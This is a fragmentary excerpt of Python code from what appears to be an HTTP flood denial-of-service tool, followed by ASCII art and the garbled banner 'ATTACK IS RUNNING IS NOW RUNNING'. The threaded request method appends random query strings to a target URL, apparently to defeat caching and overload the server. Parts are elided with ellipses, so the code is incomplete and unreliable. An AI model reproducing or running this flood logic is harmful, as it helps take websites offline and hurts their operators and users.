...
class HTTPThread(threading.Thread):
    def __init__(self, url, host, **kwargs):
        ...
        def httpcall(self):
            request = urllib.request.Request(self.url + self.param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3, 10)))
...
\|=============|\/|-----\____________________________________________________/
  '~~~~~~~~~~~~~\\\----\{        
                 \{     \> ATTACK IS RUNNING IS NOW RUNNING
                  \\
                   \}
